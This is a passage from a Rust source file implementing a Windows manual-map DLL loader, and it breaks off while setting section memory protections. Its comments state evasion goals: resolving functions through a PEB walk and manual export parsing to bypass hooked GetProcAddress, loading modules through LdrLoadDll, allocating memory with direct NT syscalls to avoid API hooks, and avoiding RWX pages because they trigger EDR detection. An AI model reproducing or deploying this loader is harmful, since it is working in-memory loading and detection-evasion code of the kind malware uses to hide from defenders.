//! Manual map PE loader for Windows.
#![cfg(windows)]

use anyhow::{anyhow, Result};
use goblin::pe::PE;
use std::collections::HashMap;
// Use winapi's c_void throughout to avoid type mismatches with winapi return values.
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{LIST_ENTRY, UNICODE_STRING};
// Memory and process APIs are now dispatched through nt_syscall::syscall!
// to avoid IAT-visible Win32 hooks.  Only constants remain from winapi.
use winapi::um::winnt::{
    DLL_PROCESS_ATTACH, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT,
    IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
    IMAGE_SCN_MEM_WRITE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
};
use pe_resolve;


// RUNTIME_FUNCTION (IMAGE_RUNTIME_FUNCTION_ENTRY) – 12 bytes, x64 only.
#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct RuntimeFunction {
    begin_address: u32,
    end_address: u32,
    unwind_info_address: u32,
}

#[cfg(target_arch = "x86_64")]
extern "system" {
    /// Registers a dynamic function table so the OS can unwind exceptions
    /// inside memory-mapped code.  Declared here because winapi 0.3 does not
    /// expose it at a stable path.
    fn RtlAddFunctionTable(
        function_table: *const RuntimeFunction,
        entry_count: u32,
        base_address: u64,
    ) -> u8; // BOOLEAN
}

// 1. Defining PEB and LDR structures to walk PEB

#[repr(C)]
struct PEB {
    InheritedAddressSpace: u8,
    ReadImageFileExecOptions: u8,
    BeingDebugged: u8,
    BitFields: u8,
    Mutant: *mut c_void,
    ImageBaseAddress: *mut c_void,
    Ldr: *mut PEB_LDR_DATA,
}

#[repr(C)]
struct PEB_LDR_DATA {
    Length: u32,
    Initialized: u8,
    SsHandle: *mut c_void,
    InLoadOrderModuleList: LIST_ENTRY,
    InMemoryOrderModuleList: LIST_ENTRY,
    InInitializationOrderModuleList: LIST_ENTRY,
}

#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    InLoadOrderLinks: LIST_ENTRY,
    InMemoryOrderLinks: LIST_ENTRY,
    InInitializationOrderLinks: LIST_ENTRY,
    DllBase: *mut c_void,
    EntryPoint: *mut c_void,
    SizeOfImage: u32,
    FullDllName: UNICODE_STRING,
    BaseDllName: UNICODE_STRING,
}

/// Load a module using LdrLoadDll resolved via PEB walk — avoids LoadLibraryA.
unsafe fn load_via_ldr(module_name: &str) -> *mut c_void {
    // Resolve LdrLoadDll from the already-loaded ntdll via PEB walk.
    let ntdll = get_module_handle_peb("ntdll.dll");
    if ntdll.is_null() {
        return std::ptr::null_mut();
    }
    let ldr_load_dll_ptr = get_proc_address_manual(ntdll, "LdrLoadDll");
    if ldr_load_dll_ptr.is_null() {
        return std::ptr::null_mut();
    }

    type LdrLoadDllFn = unsafe extern "system" fn(
        search_path: *const u16,
        dll_characteristics: *const u32,
        module_name: *const winapi::shared::ntdef::UNICODE_STRING,
        base_address: *mut *mut c_void,
    ) -> i32;
    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_load_dll_ptr);

    // Build a UNICODE_STRING for the module name.
    let mut wide: Vec<u16> = module_name
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let mut us = winapi::shared::ntdef::UNICODE_STRING {
        Length: ((wide.len() - 1) * 2) as u16,
        MaximumLength: (wide.len() * 2) as u16,
        Buffer: wide.as_mut_ptr(),
    };

    let mut base: *mut c_void = std::ptr::null_mut();
    let status = ldr_load_dll(std::ptr::null(), std::ptr::null(), &us, &mut base);
    if status < 0 {
        std::ptr::null_mut()
    } else {
        base
    }
}

unsafe fn get_module_handle_peb(module_name: &str) -> *mut c_void {
    #[cfg(target_arch = "x86_64")]
    let peb: *mut PEB = {
        let mut p: *mut c_void;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) p);
        p as *mut PEB
    };

    #[cfg(target_arch = "x86")]
    let peb: *mut PEB = {
        let mut p: *mut c_void;
        std::arch::asm!("mov {}, fs:[0x30]", out(reg) p);
        p as *mut PEB
    };

    if peb.is_null() || (*peb).Ldr.is_null() {
        return std::ptr::null_mut();
    }

    let ldr = (*peb).Ldr;
    let list_head = &mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
    let mut current = (*list_head).Flink;

    let name_lower = module_name.to_lowercase();
    let name_no_ext = name_lower.trim_end_matches(".dll");

    while current != list_head && !current.is_null() {
        let entry = current as *mut LDR_DATA_TABLE_ENTRY;
        let base_dll_name = &(*entry).BaseDllName;

        if base_dll_name.Length > 0 && !base_dll_name.Buffer.is_null() {
            let slice = std::slice::from_raw_parts(
                base_dll_name.Buffer,
                (base_dll_name.Length / 2) as usize,
            );
            if let Ok(name) = String::from_utf16(slice) {
                let n = name.to_lowercase();
                if n == name_lower || n.trim_end_matches(".dll") == name_no_ext {
                    return (*entry).DllBase;
                }
            }
        }
        current = (*current).Flink;
    }
    std::ptr::null_mut()
}

/// Resolve a function by ordinal from a module's export table without calling
/// the hookable `GetProcAddress`.  Used for delay-import ordinal entries.
unsafe fn get_proc_address_by_ordinal_manual(module: *mut c_void, ordinal: u16) -> *mut c_void {
    if module.is_null() {
        return std::ptr::null_mut();
    }
    let base = module as *const u8;
    let dos_header = &*(base as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {
        return std::ptr::null_mut();
    }
    let e_lfanew = dos_header.e_lfanew as usize;

    #[cfg(target_arch = "x86")]
    use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
    #[cfg(target_arch = "x86_64")]
    use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

    let nt_headers = &*(base.add(e_lfanew) as *const IMAGE_NT_HEADERS);
    if nt_headers.Signature != 0x4550 {
        return std::ptr::null_mut();
    }
    let export_dir_rva = nt_headers.OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        .VirtualAddress;
    let export_dir_size =
        nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;
    if export_dir_rva == 0 {
        return std::ptr::null_mut();
    }
    let export_dir = &*(base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    // OrdinalBase: the lowest ordinal exported by this module.
    // index into AddressOfFunctions = ordinal - OrdinalBase
    let base_ord = export_dir.Base;
    if (ordinal as u32) < base_ord {
        return std::ptr::null_mut();
    }
    let index = (ordinal as u32 - base_ord) as usize;
    if index >= export_dir.NumberOfFunctions as usize {
        return std::ptr::null_mut();
    }
    let funcs = std::slice::from_raw_parts(
        base.add(export_dir.AddressOfFunctions as usize) as *const u32,
        export_dir.NumberOfFunctions as usize,
    );
    let func_rva = funcs[index];
    if func_rva == 0 {
        return std::ptr::null_mut();
    }

    // Forwarded export check: if func_rva falls within the export directory
    // range, the bytes at func_rva are a null-terminated ASCII forwarder
    // string of the form "ModuleName.FunctionName" (or "ModuleName.#Ordinal").
    if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
        let fwd_ptr = base.add(func_rva as usize) as *const u8;
        let mut fwd_len = 0;
        while *fwd_ptr.add(fwd_len) != 0 {
            fwd_len += 1;
        }
        let fwd_slice = std::slice::from_raw_parts(fwd_ptr, fwd_len);
        if let Ok(fwd_str) = std::str::from_utf8(fwd_slice) {
            if let Some(dot) = fwd_str.find('.') {
                let target_mod = &fwd_str[..dot];
                let target_fn = &fwd_str[dot + 1..];
                // Try PEB walk first, then fall back to a ntdll-direct load.
                let mut mod_handle = get_module_handle_peb(target_mod);
                if mod_handle.is_null() {
                    mod_handle = load_via_ldr(target_mod);
                }
                if !mod_handle.is_null() {
                    // The forwarder target may be a name ("FuncName") or an
                    // ordinal reference ("#123").  Handle both forms.
                    if let Some(ordinal_str) = target_fn.strip_prefix('#') {
                        if let Ok(target_ord) = ordinal_str.parse::<u16>() {
                            return get_proc_address_by_ordinal_manual(mod_handle, target_ord);
                        }
                    } else {
                        return get_proc_address_manual(mod_handle, target_fn);
                    }
                }
            }
        }
        return std::ptr::null_mut();
    }

    base.add(func_rva as usize) as *mut c_void
}

unsafe fn get_proc_address_manual(module: *mut c_void, proc_name: &str) -> *mut c_void {
    // Bounded recursion guard: forwarded exports can chain across modules
    // (kernel32!HeapAlloc -> ntdll!RtlAllocateHeap -> ...).  A pathological
    // or malicious export table could form a cycle; cap the depth.
    thread_local! {
        static FORWARDER_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
    }
    const MAX_FORWARDER_DEPTH: u32 = 8;
    let depth = FORWARDER_DEPTH.with(|c| c.get());
    if depth >= MAX_FORWARDER_DEPTH {
        return std::ptr::null_mut();
    }
    FORWARDER_DEPTH.with(|c| c.set(depth + 1));
    struct DepthGuard;
    impl Drop for DepthGuard {
        fn drop(&mut self) {
            FORWARDER_DEPTH.with(|c| c.set(c.get().saturating_sub(1)));
        }
    }
    let _g = DepthGuard;

    if module.is_null() {
        return std::ptr::null_mut();
    }
    let base = module as *const u8;
    let dos_header = &*(base as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {
        return std::ptr::null_mut();
    }

    let e_lfanew = dos_header.e_lfanew as usize;

    #[cfg(target_arch = "x86")]
    use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
    #[cfg(target_arch = "x86_64")]
    use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

    let nt_headers = &*(base.add(e_lfanew) as *const IMAGE_NT_HEADERS);
    if nt_headers.Signature != 0x4550 {
        return std::ptr::null_mut();
    }

    let export_dir_rva = nt_headers.OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        .VirtualAddress;
    let export_dir_size =
        nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;
    if export_dir_rva == 0 {
        // No export directory — cannot resolve this function manually.
        return std::ptr::null_mut();
    }

    let export_dir = &*(base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    let names = std::slice::from_raw_parts(
        base.add(export_dir.AddressOfNames as usize) as *const u32,
        export_dir.NumberOfNames as usize,
    );
    let funcs = std::slice::from_raw_parts(
        base.add(export_dir.AddressOfFunctions as usize) as *const u32,
        export_dir.NumberOfFunctions as usize,
    );
    let ords = std::slice::from_raw_parts(
        base.add(export_dir.AddressOfNameOrdinals as usize) as *const u16,
        export_dir.NumberOfNames as usize,
    );

    for i in 0..export_dir.NumberOfNames as usize {
        let name_rva = names[i];
        let name_ptr = base.add(name_rva as usize) as *const u8;
        let mut len = 0;
        while *name_ptr.add(len) != 0 {
            len += 1;
        }
        let name_slice = std::slice::from_raw_parts(name_ptr, len);
        if let Ok(n) = std::str::from_utf8(name_slice) {
            if n == proc_name {
                let func_rva = funcs[ords[i] as usize];
                if func_rva != 0 {
                    let addr = base.add(func_rva as usize) as *mut c_void;
                    if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
                        // Forwarded export: bytes at func_rva are a null-terminated ASCII
                        // string of the form "ModuleName.FunctionName".
                        let fwd_ptr = base.add(func_rva as usize) as *const u8;
                        let mut fwd_len = 0;
                        while *fwd_ptr.add(fwd_len) != 0 {
                            fwd_len += 1;
                        }
                        let fwd_slice = std::slice::from_raw_parts(fwd_ptr, fwd_len);
                        if let Ok(fwd_str) = std::str::from_utf8(fwd_slice) {
                            if let Some(dot) = fwd_str.find('.') {
                                let target_mod = &fwd_str[..dot];
                                let target_fn = &fwd_str[dot + 1..];
                                // Try PEB walk first, then fall back to a ntdll-direct load.
                                let mut mod_handle = get_module_handle_peb(target_mod);
                                if mod_handle.is_null() {
                                    mod_handle = load_via_ldr(target_mod);
                                }
                                if !mod_handle.is_null() {
                                    return get_proc_address_manual(mod_handle, target_fn);
                                }
                            }
                        }
                        return std::ptr::null_mut();
                    }
                    return addr;
                }
            }
        }
    }

    // Function not found in the export table — return null rather than
    // calling the hooked Win32 GetProcAddress.
    std::ptr::null_mut()
}

pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
    let pe = PE::parse(dll_bytes)?;
    let optional_header = pe
        .header
        .optional_header
        .ok_or_else(|| anyhow!("PE has no optional header"))?;

    // 1. Allocate memory for the DLL.
    // Try the preferred image base first to avoid relocations when that VA
    // range is available, then fall back to an OS-chosen address.
    // Use NtAllocateVirtualMemory to avoid IAT-visible VirtualAlloc hooks.
    let _ = nt_syscall::init_syscall_infrastructure(); // idempotent

    let preferred_base_ptr = optional_header.windows_fields.image_base as *mut c_void;
    let image_size = optional_header.windows_fields.size_of_image as usize;
    let mut preferred_alloc = preferred_base_ptr;
    let mut alloc_size = image_size;
    let pref_status = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        -1isize as u64, // current process
        &mut preferred_alloc as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    let preferred_ok = pref_status.map_or(false, |s| s >= 0) && !preferred_alloc.is_null();

    let (image_base, used_fallback_alloc) = if !preferred_ok {
        let mut fallback: *mut c_void = std::ptr::null_mut();
        let mut fb_size = image_size;
        let fb_status = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            -1isize as u64,
            &mut fallback as *mut _ as u64,
            0u64,
            &mut fb_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if fb_status.map_or(true, |s| s < 0) || fallback.is_null() {
            return Err(anyhow!("NtAllocateVirtualMemory failed"));
        }
        (fallback, true)
    } else {
        (preferred_alloc, false)
    };

    let preferred_base = optional_header.windows_fields.image_base as isize;
    let base_delta = image_base as isize - preferred_base;
    if used_fallback_alloc && base_delta != 0 {
        // When preferred-base allocation fails, rebasing is mandatory.
        // Refuse to continue unless a sane relocation directory exists.
        let reloc_dir = optional_header.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
            .ok_or_else(|| anyhow!(
                "VirtualAlloc at preferred base failed and PE has no relocation directory; cannot apply rebasing"
            ))?;
        if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
            return Err(anyhow!(
                "VirtualAlloc at preferred base failed and relocation directory is empty; cannot apply rebasing"
            ));
        }

        let image_size = optional_header.windows_fields.size_of_image as usize;
        let reloc_start = reloc_dir.virtual_address as usize;
        let reloc_size = reloc_dir.size as usize;
        let reloc_end = reloc_start
            .checked_add(reloc_size)
            .ok_or_else(|| anyhow!("relocation directory range overflow"))?;
        if reloc_start >= image_size || reloc_end > image_size {
            return Err(anyhow!(
                "VirtualAlloc at preferred base failed and relocation directory is out of image bounds"
            ));
        }
    }

    struct AllocGuard {
        ptr: *mut c_void,
        success: bool,
    }
    impl Drop for AllocGuard {
        fn drop(&mut self) {
            if !self.success {
                unsafe {
                    let mut base = self.ptr;
                    let mut size: usize = 0;
                    let _ = nt_syscall::syscall!(
                        "NtFreeVirtualMemory",
                        -1isize as u64,
                        &mut base as *mut _ as u64,
                        &mut size as *mut _ as u64,
                        MEM_RELEASE as u64,
                    );
                }
            }
        }
    }
    let mut _guard = AllocGuard {
        ptr: image_base,
        success: false,
    };

    // 1b. Copy PE headers (DOS header, NT headers, section table) so that
    //     DLLs which inspect their own headers at runtime (resource lookup,
    //     TLS callbacks, etc.) find the expected data rather than zeroed memory.
    let size_of_headers = optional_header.windows_fields.size_of_headers as usize;
    std::ptr::copy_nonoverlapping(
        dll_bytes.as_ptr(),
        image_base as *mut u8,
        size_of_headers.min(dll_bytes.len()),
    );

    // 2. Copy sections
    for section in &pe.sections {
        let raw_offset = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        if raw_offset.saturating_add(raw_size) > dll_bytes.len() {
            return Err(anyhow!(
                "PE section data (offset {:#x} + size {:#x}) exceeds DLL buffer length {}; PE is corrupt",
                raw_offset,
                raw_size,
                dll_bytes.len()
            ));
        }
        let dest = image_base.add(section.virtual_address as usize);
        let src = dll_bytes.as_ptr().add(raw_offset);
        std::ptr::copy_nonoverlapping(src, dest as *mut u8, raw_size);
    }

    // 3. Process imports
    let mut loaded_modules: HashMap<&str, *mut c_void> = HashMap::new();
    for import in &pe.imports {
        let dll_name = import.dll;
        if !loaded_modules.contains_key(dll_name) {
            let mut handle = get_module_handle_peb(dll_name);
            if handle.is_null() {
                handle = load_via_ldr(dll_name);
                if handle.is_null() {
                    return Err(anyhow!("Failed to load dependent module {}", dll_name));
                }
            }
            loaded_modules.insert(dll_name, handle);
        }
        let module_handle = *loaded_modules.get(dll_name).unwrap();
        let proc_addr = get_proc_address_manual(module_handle, &import.name);
        if proc_addr.is_null() {
            return Err(anyhow!("Failed to resolve function {}", import.name));
        }
        // Width-aware IAT write: PE32+ uses 8-byte thunks, PE32 uses 4-byte.
        let is_pe32_plus = optional_header.standard_fields.magic == 0x020B;
        let thunk_ref = image_base.add(import.rva);
        if is_pe32_plus {
            *(thunk_ref as *mut u64) = proc_addr as u64;
        } else {
            *(thunk_ref as *mut u32) = proc_addr as u32;
        }
    }

    // 3b. Process delay imports (IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT = 13).
    //
    // ImgDelayDescr layout — all fields are RVAs when grAttrs bit 0 (dlattrRva) is set:
    //   +0x00  grAttrs       u32  — bit 0 = 1 means all addresses are RVAs
    //   +0x04  rvaDLLName    u32  — RVA of DLL name string
    //   +0x08  rvaHmod       u32  — RVA of HMODULE slot
    //   +0x0C  rvaIAT        u32  — RVA of IAT (thunks that will be resolved)
    //   +0x10  rvaINT        u32  — RVA of INT (original unbound thunks)
    //   +0x14  rvaBoundIAT   u32  — RVA of bound IAT (may be NULL)
    //   +0x18  rvaUnloadIAT  u32  — RVA of unload IAT (may be NULL)
    //   +0x1C  dwTimeStamp   u32  — time stamp (0 = not bound)
    const IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT: usize = 13;
    const DELAY_DESCR_SIZE: usize = 32; // 8 × u32

    if let Some(delay_dir) = optional_header.data_directories.data_directories
        [IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT]
    {
        if delay_dir.virtual_address != 0 && delay_dir.size > 0 {
            let image_size = optional_header.size_of_image as usize;
            let mut desc_va = delay_dir.virtual_address as usize;

            loop {
                // Bounds check for the descriptor itself.
                if desc_va + DELAY_DESCR_SIZE > image_size {
                    break;
                }

                // Read descriptor fields directly from the mapped image.
                let base_ptr = image_base as *const u8;
                let grattrs       = *(base_ptr.add(desc_va)        as *const u32);
                let dll_name_rva  = *(base_ptr.add(desc_va + 0x04) as *const u32) as usize;
                let hmod_rva      = *(base_ptr.add(desc_va + 0x08) as *const u32) as usize;
                let iat_rva       = *(base_ptr.add(desc_va + 0x0C) as *const u32) as usize;
                let int_rva       = *(base_ptr.add(desc_va + 0x10) as *const u32) as usize;

                // Null-terminator descriptor: all-zero entry.
                if dll_name_rva == 0 {
                    break;
                }

                // Validate that addresses are RVAs (grAttrs bit 0 set).  Old-style
                // VAs (grAttrs bit 0 clear) are not supported on modern x64 images.
                if grattrs & 0x1 == 0 {
                    tracing::warn!(
                        "manual_map: delay-import descriptor at rva {:#x} uses legacy VA format; skipping",
                        desc_va
                    );
                    desc_va += DELAY_DESCR_SIZE;
                    continue;
                }

                // Resolve DLL name from the mapped image.
                if dll_name_rva >= image_size {
                    desc_va += DELAY_DESCR_SIZE;
                    continue;
                }
                let dll_name_ptr = base_ptr.add(dll_name_rva) as *const i8;
                let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr)
                    .to_str()
                    .unwrap_or("");
                if dll_name.is_empty() {
                    break;
                }

                // Find or load the DLL.
                let dll_handle = if !loaded_modules.contains_key(dll_name) {
                    let mut handle = get_module_handle_peb(dll_name);
                    if handle.is_null() {
                        handle = load_via_ldr(dll_name);
                        if handle.is_null() {
                            tracing::warn!(
                                "manual_map: delay-import: failed to load {}; skipping descriptor",
                                dll_name
                            );
                            desc_va += DELAY_DESCR_SIZE;
                            continue;
                        }
                    }
                    loaded_modules.insert(dll_name, handle);
                    handle
                } else {
                    *loaded_modules.get(dll_name).unwrap()
                };

                // Walk the INT (use IAT as fallback if INT is zero) and write
                // resolved addresses into the IAT slots.
                //
                // PE32+ (64-bit): each IMAGE_THUNK_DATA64 entry is 8 bytes.
                //   bit 63 set   → ordinal import (low 16 bits = ordinal)
                //   bit 63 clear → RVA to IMAGE_IMPORT_BY_NAME (2-byte hint + name)
                // PE32 (32-bit): each IMAGE_THUNK_DATA32 entry is 4 bytes.
                //   bit 31 set   → ordinal import (low 16 bits = ordinal)
                //   bit 31 clear → RVA to IMAGE_IMPORT_BY_NAME
                let is_pe32_plus = optional_header.standard_fields.magic == 0x020B;
                let thunk_entry_size: usize = if is_pe32_plus { 8 } else { 4 };
                let ordinal_flag_mask: u64 = if is_pe32_plus { 1u64 << 63 } else { 1u64 << 31 };
                let rva_mask: u64 = if is_pe32_plus { 0x7FFF_FFFF_FFFF_FFFF } else { 0x7FFF_FFFF };

                let thunk_base_rva = if int_rva != 0 { int_rva } else { iat_rva };
                if thunk_base_rva == 0 || iat_rva == 0 {
                    desc_va += DELAY_DESCR_SIZE;
                    continue;
                }

                let mut slot_idx = 0usize;
                loop {
                    let thunk_rva = thunk_base_rva + slot_idx * thunk_entry_size;
                    let iat_slot_rva = iat_rva + slot_idx * thunk_entry_size;
                    if thunk_rva + thunk_entry_size > image_size || iat_slot_rva + thunk_entry_size > image_size {
                        break;
                    }

                    let thunk_val: u64 = if is_pe32_plus {
                        *(base_ptr.add(thunk_rva) as *const u64)
                    } else {
                        *(base_ptr.add(thunk_rva) as *const u32) as u64
                    };
                    if thunk_val == 0 {
                        break;
                    }

                    let proc_addr: *mut c_void = if thunk_val & ordinal_flag_mask != 0 {
                        // Ordinal import — look up directly in the export ordinal table.
                        let ordinal = (thunk_val & 0xFFFF) as u16;
                        get_proc_address_by_ordinal_manual(dll_handle, ordinal)
                    } else {
                        // Named import: RVA to IMAGE_IMPORT_BY_NAME (+2 bytes hint, then name).
                        let ibn_rva = (thunk_val & rva_mask) as usize;
                        if ibn_rva + 2 >= image_size {
                            slot_idx += 1;
                            continue;
                        }
                        let name_ptr = base_ptr.add(ibn_rva + 2) as *const i8;
                        let func_name = std::ffi::CStr::from_ptr(name_ptr)
                            .to_str()
                            .unwrap_or("");
                        if func_name.is_empty() {
                            slot_idx += 1;
                            continue;
                        }
                        get_proc_address_manual(dll_handle, func_name)
                    };
                    if proc_addr.is_null() {
                        tracing::warn!(
                            "manual_map: delay-import: {}!slot-{} unresolved; leaving slot empty",
                            dll_name, slot_idx
                        );
                    } else {
                        // Write the resolved address into the IAT slot.
                        // Use the correct slot width for the image's PE format.
                        if is_pe32_plus {
                            *(image_base.add(iat_slot_rva) as *mut u64) = proc_addr as u64;
                        } else {
                            *(image_base.add(iat_slot_rva) as *mut u32) = proc_addr as u32;
                        }
                    }

                    slot_idx += 1;
                }

                // Set the HMODULE field to the loaded module base so the
                // delay-import helper knows the DLL has already been loaded.
                if hmod_rva + std::mem::size_of::<usize>() <= image_size {
                    *(image_base.add(hmod_rva) as *mut usize) = dll_handle as usize;
                }

                desc_va += DELAY_DESCR_SIZE;
            }
        }
    }

    // 4. Apply base relocations
    if base_delta != 0 {
        if let Some(reloc_entry) = optional_header.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
        {
            if reloc_entry.virtual_address != 0 && reloc_entry.size > 0 {
                let reloc_size = reloc_entry.size as usize;
                let block_rva = reloc_entry.virtual_address as usize;
                // Snapshot the entire relocation directory into a local buffer
                // *before* applying any patches.  Without this, a relocation
                // entry whose target falls inside the .reloc section itself
                // (or whose patch happens to overlap the next block header due
                // to merged/overlapping sections) could rewrite the headers we
                // are about to read on the next iteration, leading to
                // unpredictable behaviour.  Reading from a pristine copy makes
                // the iteration deterministic.
                let reloc_data: Vec<u8> =
                    std::slice::from_raw_parts(image_base.add(block_rva) as *const u8, reloc_size)
                        .to_vec();

                let mut offset = 0usize;
                while offset + 8 <= reloc_size {
                    let page_rva =
                        u32::from_le_bytes(reloc_data[offset..offset + 4].try_into().unwrap())
                            as usize;
                    let block_size =
                        u32::from_le_bytes(reloc_data[offset + 4..offset + 8].try_into().unwrap())
                            as usize;
                    if block_size < 8 || offset + block_size > reloc_size {
                        break;
                    }
                    let entries_count = (block_size - 8) / 2;
                    let entries_start = offset + 8;
                    for i in 0..entries_count {
                        let off = entries_start + i * 2;
                        let entry =
                            u16::from_le_bytes(reloc_data[off..off + 2].try_into().unwrap());
                        let reloc_type = (entry >> 12) as u8;
                        let reloc_offset = (entry & 0x0FFF) as usize;
                        if reloc_type == 10 {
                            // IMAGE_REL_BASED_DIR64: 64-bit absolute VA (x64, ARM64)
                            let addr = image_base.add(page_rva + reloc_offset) as *mut isize;
                            *addr += base_delta;
                        } else if reloc_type == 3 {
                            // IMAGE_REL_BASED_HIGHLOW: 32-bit absolute VA (x86, ARM32)
                            let addr = image_base.add(page_rva + reloc_offset) as *mut i32;
                            *addr = (*addr as isize + base_delta) as i32;
                        } else if reloc_type == 5 || reloc_type == 7 {
                            // IMAGE_REL_BASED_ARM_MOV32 (5) / IMAGE_REL_BASED_THUMB_MOV32 (7):
                            // A MOVW + MOVT instruction pair encodes a 32-bit absolute VA.
                            // ARM32 instruction encoding (ARM_MOV32, type 5):
                            //   bits[19:16] = imm4, bits[11:0] = imm12  → imm16 = (imm4<<12)|imm12
                            // Thumb-2 T3 encoding (THUMB_MOV32, type 7):
                            //   upper word: bits[19:16]=imm4, bit[26]=i
                            //   lower word: bits[14:12]=imm3, bits[7:0]=imm8 → imm16 = (imm4<<12)|(i<<11)|(imm3<<8)|imm8
                            let is_thumb = reloc_type == 7;
                            let movw_ptr = image_base.add(page_rva + reloc_offset) as *mut u32;
                            let movt_ptr = movw_ptr.add(1);
                            let movw = u32::from_le(*movw_ptr);
                            let movt = u32::from_le(*movt_ptr);
                            let (lo16, hi16) = if is_thumb {
                                let extract_t = |v: u32| -> u16 {
                                    let imm4 = ((v >> 16) & 0xF) as u16;
                                    let i = ((v >> 26) & 0x1) as u16;
                                    let imm3 = ((v >> 12) & 0x7) as u16;
                                    let imm8 = (v & 0xFF) as u16;
                                    (imm4 << 12) | (i << 11) | (imm3 << 8) | imm8
                                };
                                (extract_t(movw), extract_t(movt))
                            } else {
                                let extract_a = |v: u32| -> u16 {
                                    let imm4 = ((v >> 16) & 0xF) as u16;
                                    let imm12 = (v & 0xFFF) as u16;
                                    (imm4 << 12) | imm12
                                };
                                (extract_a(movw), extract_a(movt))
                            };
                            let orig_va = (lo16 as u32) | ((hi16 as u32) << 16);
                            let new_va = ((orig_va as isize).wrapping_add(base_delta)) as u32;
                            let new_lo = (new_va & 0xFFFF) as u16;
                            let new_hi = (new_va >> 16) as u16;
                            if is_thumb {
                                let patch_t = |v: u32, val: u16| -> u32 {
                                    let imm4 = ((val >> 12) & 0xF) as u32;
                                    let i = ((val >> 11) & 0x1) as u32;
                                    let imm3 = ((val >> 8) & 0x7) as u32;
                                    let imm8 = (val & 0xFF) as u32;
                                    (v & !((0xF << 16) | (1 << 26) | (0x7 << 12) | 0xFF))
                                        | (imm4 << 16)
                                        | (i << 26)
                                        | (imm3 << 12)
                                        | imm8
                                };
                                *movw_ptr = patch_t(movw, new_lo).to_le();
                                *movt_ptr = patch_t(movt, new_hi).to_le();
                            } else {
                                let patch_a = |v: u32, val: u16| -> u32 {
                                    let imm4 = ((val >> 12) & 0xF) as u32;
                                    let imm12 = (val & 0xFFF) as u32;
                                    (v & !((0xF << 16) | 0xFFF)) | (imm4 << 16) | imm12
                                };
                                *movw_ptr = patch_a(movw, new_lo).to_le();
                                *movt_ptr = patch_a(movt, new_hi).to_le();
                            }
                        } else if reloc_type == 11 || reloc_type == 12 || reloc_type == 13 {
                            // ARM64 PC-relative entries (ADRP / ADD page-offset / LDR page-offset):
                            // these are self-relative and require no patch for a uniform image rebase
                            // because both the instruction's page and its target move by the same delta.
                        } else if reloc_type != 0 {
                            // Type 0 = IMAGE_REL_BASED_ABSOLUTE — padding, no action.
                            // Anything else is an unrecognised type; log at debug level so callers
                            // can diagnose partial-relocation issues without crashing.
                            #[cfg(debug_assertions)]
                            tracing::debug!(
                                "manual_map: skipping unhandled relocation type {} at rva+offset {:#x}",
                                reloc_type, page_rva + reloc_offset
                            );
                        }
                    }
                    offset += block_size;
                }
            }
        }
    }

    // 5. Set memory protections
    for section in &pe.sections {
        // PAGE_* constants are mutually exclusive — never OR them together.
        // Map (exec, read, write) characteristic flags to the single PAGE_*
        // value that best approximates the requested protection.
        let exec = section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = section.characteristics & IMAGE_SCN_MEM_READ != 0;
        let write = section.characteristics & IMAGE_SCN_MEM_WRITE != 0;
        let prot: u32 = match (exec, read, write) {
            // Downgrade W+X to PAGE_EXECUTE_READ.  No legitimate section
            // needs RWX at load time; RWX pages are a major EDR detection
            // signal.  If a section's own code needs temporary write access
            // after load it should call VirtualProtect itself.
            (true, _, true) => PAGE_EXECUTE_READ,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };
        let mut old_prot = 0;
